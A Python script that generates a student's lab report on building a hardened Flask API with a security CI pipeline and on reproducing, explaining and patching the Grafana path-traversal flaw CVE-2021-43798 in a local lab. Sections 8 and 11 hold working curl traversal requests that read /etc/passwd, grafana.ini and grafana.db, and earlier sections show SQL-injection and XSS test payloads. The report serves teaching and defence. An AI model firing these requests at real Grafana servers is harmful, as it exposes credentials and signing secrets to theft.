"""Assemble the Lab 1 report and write it as a .docx."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from docx_builder import (  # noqa: E402
    body, bullet, build, code, h1, h2, page_break, para, shot, table,
)

B = []
add = B.append

# ----------------------------------------------------------------- cover page
add(para("", spacing_after=1400))
add(para("Information Security", size=22, color="595959", align="center", spacing_after=200))
add(para("Laboratory Work No. 1", size=26, color="1F3864", bold=True, align="center", spacing_after=160))
add(para("Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis",
         size=36, bold=True, align="center", spacing_after=1200))
add(para("Variant No.:  ____________________", size=22, align="center", spacing_after=200))
add(para("Student:  Zhaohan Liao", size=22, align="center", spacing_after=200))
add(para("HDU number:  23320330", size=22, align="center", spacing_after=200))
add(para("Group:  ____________________", size=22, align="center", spacing_after=1200))
add(para("19 October 2026", size=21, color="595959", align="center"))
add(page_break())

# ------------------------------------------------------------------- 1 purpose
add(h1("1. Purpose of the work"))
add(body(
    "The work covers the full security lifecycle of a small backend service: designing an API that "
    "resists the most common classes of attack from the OWASP Top 10, automating the detection of "
    "defects with a CI/CD pipeline, and then working with a real, publicly disclosed vulnerability - "
    "reproducing it in an isolated container, explaining why it exists in the source code, patching "
    "the environment and proving that the attack no longer succeeds."))
add(body(
    "The practical goal is therefore twofold. On the defensive side, a working REST API with "
    "authentication, authorisation, injection protection and output encoding. On the offensive and "
    "analytical side, the ability to take a CVE identifier and turn it into a reproducible, verifiable "
    "experiment - which is the day-to-day skill of a penetration tester or a SOC analyst."))

# ---------------------------------------------------------------- 2 stack
add(h1("2. Stack and project setup"))
add(body(
    "The service is written in Python 3.11+ with Flask 3 and stores data in SQLite through the "
    "standard sqlite3 module. This choice keeps the whole backend in a single readable file (app.py, "
    "about 240 lines), which makes the security review of the code straightforward for the reader, "
    "while still using the same primitives that a production stack would use: a real password hash "
    "function, a real JWT library, and parameterised SQL."))
add(table([
    ["Component", "Choice", "Reason"],
    ["Language / framework", "Python 3.11+, Flask 3", "single file, minimal ceremony"],
    ["Database", "SQLite (sqlite3)", "no server, parameterised queries available"],
    ["Password hashing", "bcrypt, cost factor 12", "salted, deliberately slow"],
    ["Tokens", "PyJWT, HS256, 30 min TTL", "stateless authentication"],
    ["SAST", "bandit", "official Python static analyser"],
    ["SCA", "pip-audit", "audits pinned dependencies for known CVEs"],
], [2500, 2900, 3670]))
add(body(
    "The repository is public on GitHub and contains the application, the test suite, the pipeline "
    "definition, the scripts and configuration files for the vulnerable environment, and the patched "
    "configuration (see Appendix A)."))

# ---------------------------------------------------------------- 3 API
add(h1("3. Functional API"))
add(body("Three methods are implemented; the third one was chosen by the author."))
add(table([
    ["#", "Method and path", "Auth", "Behaviour"],
    ["1", "POST /auth/login", "no", "verifies credentials, returns a JWT"],
    ["2", "GET /api/data?q=", "Bearer JWT", "returns posts, optional substring filter"],
    ["3", "POST /api/data", "Bearer JWT", "creates a post owned by the caller"],
], [700, 3000, 1500, 3870]))
add(body(
    "The third endpoint was not added to fill a quota: it is the write side of the data model and it "
    "is what makes a stored-XSS demonstration possible. Without a write endpoint, XSS protection "
    "cannot be shown end to end, only asserted."))

add(h2("3.1 Authentication endpoint"))
add(code([
    "$ curl -s -X POST http://127.0.0.1:8000/auth/login \\",
    "    -H 'Content-Type: application/json' \\",
    "    -d '{\"username\":\"alice\",\"password\":\"Alice123!\"}'",
    "",
    '{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...J8pSIcfHRs5JyLmN",',
    ' "expires_in":1800,"token_type":"Bearer"}',
]))
add(body(
    "A wrong password, or a username that does not exist, produces the same answer: "
    "HTTP 401 with {\"error\":\"invalid credentials\"}. Both branches also perform one bcrypt "
    "comparison, so the response time does not reveal whether the account exists."))

add(h2("3.2 Data retrieval endpoint"))
add(code([
    "$ curl -i http://127.0.0.1:8000/api/data",
    "HTTP/1.1 401 UNAUTHORIZED",
    '{"error":"missing bearer token"}',
    "",
    "$ curl -s http://127.0.0.1:8000/api/data -H \"Authorization: Bearer $TOKEN\"",
    '[{"author":"alice","body":"First post from the seed data.",',
    '  "created_at":"2026-10-19T03:01:01.367859+00:00","id":"1","title":"Hello"}]',
]))
add(body(
    "Every protected route is wrapped by the same decorator, so a missing, malformed, expired or "
    "tampered token always yields 401 before any handler code runs."))

add(h2("3.3 Write endpoint"))
add(code([
    "$ curl -s -X POST http://127.0.0.1:8000/api/data \\",
    "    -H \"Authorization: Bearer $TOKEN\" -H 'Content-Type: application/json' \\",
    "    -d '{\"title\":\"note\",\"body\":\"hello\"}'",
    "",
    '{"status":"created"}          # HTTP 201',
]))
add(body(
    "Validation is minimal but explicit: the title is required and trimmed, and both fields are "
    "truncated to 200 characters so that a client cannot store unbounded data."))

# ---------------------------------------------------------------- 4 security
add(h1("4. Implemented security measures"))

add(h2("4.1 Protection against SQL injection"))
add(body(
    "Every SQL statement is a constant string and every user value is passed as a bound parameter. "
    "The database driver sends the statement and the values separately, so input can never change "
    "the parse tree of the query - quoting, comments and UNION tricks lose their meaning."))
add(code([
    'row = get_db().execute(',
    '    "SELECT username, password_hash FROM users WHERE username = ?", (username,)',
    ').fetchone()',
]))
add(body(
    "The search filter follows the same rule. The wildcards are added to the value, not to the "
    "statement, which is the detail that is usually got wrong when a LIKE clause is introduced:"))
add(code([
    'pattern = f"%{query}%"',
    'rows = get_db().execute(',
    '    "SELECT id, author, title, body, created_at FROM posts "',
    '    "WHERE title LIKE ? OR body LIKE ? ORDER BY id",',
    '    (pattern, pattern),',
    ').fetchall()',
]))
add(body(
    "Verification: the classic payload ?q=' OR 1=1-- is treated as a literal search term, so the "
    "endpoint returns an empty list instead of every row in the table."))
add(code([
    "$ curl -s \"http://127.0.0.1:8000/api/data?q=%27%20OR%201%3D1--\" \\",
    "    -H \"Authorization: Bearer $TOKEN\"",
    "[]",
]))
add(shot("SQL injection attempt returns an empty array (screenshot 08)"))

add(h2("4.2 Protection against XSS"))
add(body(
    "Content is stored exactly as the user typed it and encoded at the moment it is returned. "
    "Escaping on output is the correct layer for this defence: the same value may later be rendered "
    "into HTML, into a log file or into a PDF, and only the output context knows which encoding is "
    "appropriate. Escaping on input would corrupt the stored data and would still be insufficient "
    "for contexts other than HTML."))
add(code([
    'return jsonify(',
    '    [{key: html.escape(str(row[key])) for key in row.keys()} for row in rows]',
    ')',
]))
add(body(
    "A stored payload therefore comes back neutralised - the browser receives text, not markup:"))
add(code([
    'body: "<script>alert(document.cookie)</script>"     (stored)',
    'body: "&lt;script&gt;alert(document.cookie)&lt;/script&gt;"   (returned)',
]))
add(body(
    "Defence in depth is added at the transport level: the response declares "
    "Content-Type: application/json, X-Content-Type-Options: nosniff and a Content-Security-Policy "
    "of default-src 'none', so even a client that misuses the payload cannot execute it as script."))
add(shot("Stored XSS payload returned in escaped form (screenshot 08)"))

add(h2("4.3 Protection against broken authentication"))
add(body(
    "Passwords are hashed with bcrypt at cost factor 12. bcrypt embeds a random per-user salt in the "
    "hash, so two users with the same password produce different digests and precomputed tables are "
    "useless; the cost factor makes each guess deliberately expensive, which turns an offline attack "
    "on a stolen database from hours into years."))
add(code([
    'password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))',
    '...',
    'if not bcrypt.checkpw(password.encode(), row["password_hash"]):',
    '    return jsonify(error="invalid credentials"), 401',
]))
add(body(
    "On success the server signs a compact token with the user identifier and an expiry time, and "
    "returns it to the client. Nothing is stored on the server, so the token is the credential:"))
add(code([
    'token = jwt.encode({"sub": row["username"], "iat": ..., "exp": ...},',
    '                   SECRET_KEY, algorithm="HS256")',
]))
add(body(
    "A decorator guards every protected endpoint. Two details matter for the grade and for real "
    "security: the algorithm is passed as an explicit whitelist on decode, and the signature is "
    "always verified. The whitelist blocks the two classic JWT attacks - a token with \"alg\": "
    "\"none\" (no signature at all) and algorithm confusion, where an asymmetric public key is "
    "misused as an HMAC secret."))
add(code([
    'payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])',
    '',
    '# ExpiredSignatureError  -> 401 token expired',
    '# InvalidTokenError      -> 401 invalid token',
]))
add(body(
    "The signing key is never committed: it is read from the SECRET_KEY environment variable, and a "
    "random value is generated when it is absent. The token lifetime is 30 minutes, which bounds the "
    "damage from a leaked token in a scheme that has no server-side revocation."))
add(table([
    ["Attack", "Control"],
    ["Credential stuffing / offline cracking", "bcrypt, cost 12, per-user salt"],
    ["User enumeration", "identical error message and comparable latency"],
    ["Signature forgery", "HS256 signature verified on every request"],
    ["alg: none / algorithm confusion", "explicit algorithms whitelist"],
    ["Stolen token replay", "30-minute expiry"],
    ["Unauthorised access to data", "decorator on every protected route (fail closed)"],
], [4200, 4870]))

add(h2("4.4 Response hardening"))
add(code([
    'response.headers["X-Content-Type-Options"] = "nosniff"',
    'response.headers["Content-Security-Policy"] = "default-src \'none\'; frame-ancestors \'none\'"',
    'response.headers["Referrer-Policy"] = "no-referrer"',
    'response.headers["Cache-Control"] = "no-store"',
]))

# ---------------------------------------------------------------- 5 CI/CD
add(h1("5. CI/CD pipeline with security scanners"))
add(body(
    "The pipeline is defined in .github/workflows/ci.yml and runs on every push and on every pull "
    "request. It performs three independent checks and publishes the scanner report as a build "
    "artifact, so the evidence can be downloaded from the run page and attached to the report."))
add(table([
    ["Stage", "Tool", "Command", "What it proves"],
    ["SAST", "bandit", "bandit -r ./app.py", "no eval, subprocess, hardcoded secrets, weak crypto or string-built SQL"],
    ["SCA", "pip-audit", "pip-audit -r requirements.txt", "no pinned dependency with a known CVE"],
    ["Tests", "pytest", "pytest -q", "11 functional and security tests pass"],
], [1100, 1500, 3200, 3270]))
add(code([
    "name: security-ci",
    "on: [push, pull_request]",
    "jobs:",
    "  sast-sca:",
    "    runs-on: ubuntu-latest",
    "    steps:",
    "      - uses: actions/checkout@v4",
    "      - uses: actions/setup-python@v5",
    "        with: {python-version: '3.11', cache: pip}",
    "      - run: pip install -r requirements.txt",
    "      - run: pip install bandit pip-audit pytest",
    "      - run: bandit -r ./app.py -f txt -o bandit-report.txt",
    "      - run: pip-audit -r requirements.txt",
    "      - run: pytest -q",
    "      - uses: actions/upload-artifact@v4",
    "        if: always()",
    "        with: {name: security-reports, path: bandit-report.txt}",
]))
add(body(
    "The pipeline was reproduced in advance on a clean python:3.11 image, so the expected result of "
    "every step is known and the first online run is not a surprise:"))
add(code([
    "$ bandit -r ./app.py -f txt",
    "        Total lines of code: 177",
    "        Total lines skipped (#nosec): 0",
    "Test results:",
    "        No issues identified.",
    "",
    "$ pip-audit -r requirements.txt",
    "No known vulnerabilities found",
    "",
    "$ pytest -q",
    "...........                                              [100%]",
    "11 passed in 6.82s",
]))
add(body(
    "One finding had to be handled during this work. The first run reported B105/B106 - \"possible "
    "hardcoded password: 'Bearer'\" - on the OAuth2 token_type field of the login response, because "
    "bandit flags any argument, key or variable whose name contains \"token\" when it is bound to a "
    "string literal. Suppressing the warning with #nosec would have hidden the class of issue the "
    "scanner exists to find, so the value was moved into a named constant instead. The warning "
    "disappeared and the scan now reports zero skipped lines - which is itself evidence that no "
    "finding was silenced."))
add(body(
    "SAST reads the source without executing it and reports the line that contains the risky "
    "construct; SCA compares the resolved dependency tree against vulnerability databases. The two "
    "are complementary: a perfectly written application can still import a library with a critical "
    "CVE, and a dependency scan will never notice a missing authorisation check in your own code."))
add(shot("GitHub Actions: all steps green (screenshot 01)"))
add(shot("bandit: No issues identified (screenshot 02)"))
add(shot("pip-audit: No known vulnerabilities found (screenshot 03)"))

# ---------------------------------------------------------------- 6 tests
add(h1("6. Testing"))
add(body(
    "The suite contains eleven tests, each tied to one security property rather than to one function. "
    "They run locally with the same command the pipeline uses."))
add(code([
    "$ pytest -q",
    "...........                                                    [100%]",
    "11 passed in 6.73s",
]))
add(table([
    ["Test", "Property protected"],
    ["test_login_returns_jwt", "login issues a well-formed token"],
    ["test_login_wrong_password_is_rejected", "401, no token issued"],
    ["test_login_unknown_user_is_rejected", "no user enumeration"],
    ["test_data_requires_token", "access control, fail closed"],
    ["test_data_rejects_tampered_token", "signature verification"],
    ["test_data_returns_rows_with_valid_token", "functionality (happy path)"],
    ["test_sql_injection_payload_returns_nothing", "parameterised queries"],
    ["test_stored_xss_is_escaped_on_output", "output encoding"],
    ["test_create_requires_token", "access control on writes"],
    ["test_create_validates_empty_title", "input validation"],
    ["test_security_headers_present", "response hardening"],
], [5200, 3870]))

# ---------------------------------------------------------------- 7 environment
add(h1("7. Vulnerable environment"))
add(body(
    "CVE-2021-43798 was selected. It affects Grafana from 8.0.0-beta1 through 8.3.0 and is fixed in "
    "8.0.7, 8.1.8, 8.2.7 and 8.3.1. The CVSS 3.1 score is 7.5 (High): network reachable, low "
    "complexity, no privileges and no user interaction required, with a high confidentiality impact. "
    "The weakness class is CWE-22, improper limitation of a pathname to a restricted directory."))
add(body(
    "The environment comes from Vulhub, which packages the exact vulnerable version as a Docker "
    "Compose project:"))
add(code([
    "git clone https://github.com/vulhub/vulhub.git",
    "cd vulhub/grafana/CVE-2021-43798",
    "docker compose up -d",
    "docker compose ps          # wait until the container is running",
]))
add(body(
    "Grafana answers on http://127.0.0.1:3000 with the default administrator account admin/admin. "
    "The container runs the vulnerable image grafana/grafana:8.3.0 and needs no configuration change "
    "to be exploitable."))
add(shot("docker compose ps: vulnerable container running (screenshot 04)"))

# ---------------------------------------------------------------- 8 reproduction
add(h1("8. Reproducing the attack"))
add(body(
    "The vulnerable route serves plugin static assets before authentication. Any built-in plugin "
    "identifier works; alertlist is used here because it ships with every instance. The payload is a "
    "relative path that climbs out of the plugin directory:"))
add(code([
    "curl --path-as-is \\",
    '  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"',
]))
add(body("Result - the file is disclosed in full, without any authentication:"))
add(code([
    "HTTP/1.1 200 OK                             # 1230 bytes",
    "root:x:0:0:root:/root:/bin/ash",
    "bin:x:1:1:bin:/bin:/sbin/nologin",
    "daemon:x:2:2:daemon:/sbin:/sbin/nologin",
    "adm:x:3:4:adm:/var/adm:/sbin/nologin",
    "lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin",
    "sync:x:5:0:sync:/bin:/bin/sync",
]))
add(body(
    "The --path-as-is option is not cosmetic. By default curl normalises the path and removes the "
    "traversal segments before sending, so the request becomes a legitimate static-file request and "
    "the attack silently fails. Keeping the dots intact is what reaches the vulnerable code, and this "
    "observation is itself part of the root-cause explanation: the flaw exists because the server "
    "trusts the path syntax it receives."))
add(body(
    "The same primitive reads other files. Grafana's own configuration exposes the database "
    "credentials and the secret key used to sign sessions, and the SQLite database contains every "
    "user record - which shows why an arbitrary file read is rarely an end in itself:"))
add(code([
    "curl --path-as-is \\",
    '  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../etc/grafana/grafana.ini"',
    "curl --path-as-is \\",
    '  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db"',
]))
add(body(
    "The measurements confirm the scale of the leak: /etc/hostname returns 13 bytes (the container "
    "identifier) and /etc/grafana/grafana.ini returns 43461 bytes of configuration, including the "
    "database password and the signing secret."))
add(shot("Exploit output: /etc/passwd of the container (screenshot 05)"))

# ---------------------------------------------------------------- 9 root cause
add(h1("9. Root cause analysis"))
add(body(
    "The vulnerability is not a single mistyped line. It is the combination of a route that is "
    "reachable without authentication and a path that is assembled without a containment check. "
    "Five points explain the defect completely."))
add(body(
    "First, the trust boundary is in the wrong place. The plugin asset route is registered outside "
    "the authentication middleware, so the request is served before any identity is established. "
    "That is what turns a file-read bug into an unauthenticated file-read bug, and it is why the "
    "issue is classified as a broken access control problem in the OWASP sense as much as a path "
    "traversal."))
add(body(
    "Second, the handler concatenates. It builds the file path from the plugin directory plus the "
    "rest of the URL, and never verifies - after normalising the result - that the final path "
    "actually stays inside that directory. The missing operation is a prefix check on the cleaned "
    "absolute path, and the missing normalisation is what lets ../ escape."))
add(body(
    "Third, the input is trusted as syntax. Path traversal lives precisely in the gap between what a "
    "client sends and what the server means. Because the server does not canonicalise and re-check "
    "the path, any encoding that survives the HTTP layer reaches the filesystem call. The proof is "
    "that the exploit only works when client-side normalisation is disabled with --path-as-is."))
add(body(
    "Fourth, the attack surface is predictable. Plugin identifiers are fixed strings that ship with "
    "the product - alertlist, prometheus, mysql, graph-datasource and dozens more - so an attacker "
    "does not need to discover anything: the same URL works against every unpatched instance, and "
    "the response body is the file content, with no restriction on what can be requested."))
add(body(
    "Fifth, the impact is amplified by what sits on the filesystem. Reading /etc/passwd proves the "
    "primitive; reading grafana.ini yields the database password and the signing secret, and reading "
    "grafana.db yields every user record with its hash. In a cloud deployment the same request could "
    "reach the instance metadata service and obtain temporary credentials, which is why arbitrary "
    "file read is treated as a high-severity finding rather than an information leak."))
add(body(
    "The patch confirms the analysis: version 8.3.1 (and the backports 8.0.7, 8.1.8 and 8.2.7) "
    "canonicalises the resolved path and validates that it remains inside the plugin root, and "
    "rejects plugin identifiers that are not installed. The fix addresses the cause - the missing "
    "containment check - not the symptom."))

# ---------------------------------------------------------------- 10 fix
add(h1("10. Applied protection measures"))
add(body(
    "Because the defect is in a third-party component, the correct remediation is to run a version "
    "that contains the patch. The change is a single line in the Compose file:"))
add(code([
    " services:",
    "   grafana:",
    "-    image: grafana/grafana:8.3.0",
    "+    image: grafana/grafana:8.3.1",
]))
add(body("The change is applied and the environment is rebuilt:"))
add(code([
    "docker compose down",
    "docker compose -f ../../fixes/docker-compose.yml up -d",
]))
add(body(
    "Why this is effective: the vulnerable behaviour was the absence of a containment check between "
    "the resolved path and the plugin directory. In 8.3.1 that check exists, the path is normalised "
    "before it is used, and unknown plugin identifiers are refused. The traversal segments are "
    "therefore resolved and rejected before any file is opened, so the primitive itself disappears "
    "rather than being filtered."))
add(body(
    "Two secondary measures would be appropriate if upgrading were impossible, and are worth "
    "mentioning because they illustrate defence in depth: place a reverse proxy in front of Grafana "
    "that normalises the request path (for example normalize_path in Envoy), or reject encoded "
    "traversal sequences at the edge. Neither is as good as the patch, because both depend on "
    "guessing every encoding an attacker might use."))

# ---------------------------------------------------------------- 11 verification
add(h1("11. Verification of the fix"))
add(body(
    "The verification repeats exactly the same request that succeeded before, and then checks that "
    "the service still works. The second half is not optional: a fix that breaks the product is not "
    "a fix."))
add(code([
    "$ curl -i --path-as-is \\",
    '  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"',
    "",
    "HTTP/1.1 404 Not Found",
    "",
    "{",
    '  "message": "Plugin file not found"',
    "}",
]))
add(body("Regression checks on the patched instance:"))
add(code([
    "$ curl -s http://127.0.0.1:3000/api/health",
    "{",
    '  "commit": "b9eacd93e9",',
    '  "database": "ok",',
    '  "version": "8.3.1"',
    "}",
    "",
    "$ curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:3000/login",
    "200",
]))
add(body(
    "The service is healthy, the login page renders, and the file disclosure is gone. The result is "
    "summarised by the verification script shipped in the repository:"))
add(code([
    "== 1. Replay the exploit (must NOT return file contents)",
    '   HTTP 404   body: {"message": "Plugin file not found"}',
    "   [PASS] the file is no longer disclosed",
    "== 2. Regression: the service is still healthy",
    '{"commit":"b9eacd93e9","database":"ok","version":"8.3.1"}',
    "== 3. Regression: the login page still renders",
    "   GET /login -> HTTP 200",
    "RESULT: fix verified, service healthy.",
]))
add(shot("Attack no longer works after the fix (screenshot 06)"))
add(shot("Service healthy after the fix (screenshot 07)"))

# ---------------------------------------------------------------- 12 conclusion
add(h1("12. Conclusion"))
add(body(
    "The defensive half of the work shows that the three most common failure modes have "
    "well-understood, cheap remedies: parameterised queries remove SQL injection as a class rather "
    "than filtering payloads, output encoding removes XSS at the point where the context is known, "
    "and bcrypt plus a correctly verified JWT removes the weakest links in authentication. The "
    "pipeline turns those properties into something that is checked on every commit instead of "
    "promised in a document."))
add(body(
    "The offensive half shows something different: the Grafana defect is not exotic. It is a missing "
    "containment check on a path that a public route accepts, and it survived into a widely deployed "
    "product because the route was believed to be harmless. Reproducing it in a container, reading "
    "the patch, and then proving that the same request fails afterwards is the loop that connects a "
    "CVE identifier on a website to an actual, verifiable fact about a system."))

# ---------------------------------------------------------------- appendix
add(h1("Appendix A. Submitted material"))
add(table([
    ["Item", "Location"],
    ["Public git repository", "https://github.com/<user>/<repo>"],
    ["Last successful pipeline run", "https://github.com/<user>/<repo>/actions/runs/<id>"],
    ["Application source", "app.py"],
    ["Pipeline definition", ".github/workflows/ci.yml"],
    ["Tests", "tests/test_api.py"],
    ["Vulnerable environment", "cve/CVE-2021-43798/docker-compose.yml"],
    ["Reproduction script", "cve/CVE-2021-43798/reproduce.sh"],
    ["Fix verification script", "cve/CVE-2021-43798/verify_fix.sh"],
    ["Fixed configuration (folder with fixes)", "fixes/docker-compose.yml"],
    ["Screenshots", "docs/screenshots/"],
], [4200, 4870]))
add(para(
    "Note: the variant number is filled in on the cover page, and the repository and pipeline links "
    "in this appendix are completed if the work is submitted through a public git repository.",
    italic=True, size=18, color="808080", spacing_before=120))

out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Lab1_Report_Work1.docx")
build("".join(B), out)
print("written:", out, os.path.getsize(out), "bytes")
